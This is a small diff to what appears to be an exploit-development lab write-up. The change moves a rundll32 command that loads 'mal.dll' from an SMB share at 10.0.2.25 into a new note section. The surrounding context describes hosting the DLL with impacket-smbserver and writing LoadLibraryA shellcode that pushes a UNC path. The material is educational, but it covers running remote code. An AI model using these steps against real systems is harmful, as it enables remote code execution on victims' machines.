@@ -374,12 +374,6 @@ sudo impacket-smbserver -smb2support ABCD .
 
 We can test if mal.dll works as follows
 
-In a terminal on Windows,
-```
-rundll32 \\10.0.2.25\ABCD\mal.dll, xyz
-```
-
-
 #### Shellcode Generation
 We will as has been stated many times previously be using the `LoadLibraryA` function,requires which has the following function signature:
 ```
@@ -708,6 +702,13 @@ We next zero out the `EBX` register, this is so we can push the NULL value store
 We then push the UNC string in reverse order to the stack, followed by the `ESP` registers value as this now points to the start of the UNC string which is our single argument to the LoadLibraryA function.
 
 Finally we put the address of the LoadLibrayA function as found by Arwin into the `ebx` register (This is arbitrary), and call the function.
+
+## Note
+In a terminal on Windows,
+```
+rundll32 \\10.0.2.25\ABCD\mal.dll, xyz
+```
+
 
 ## Test code
 1. [exploit0.py](./SourceCode/exploit0.py): Sending 100 `A`s to crash the server.
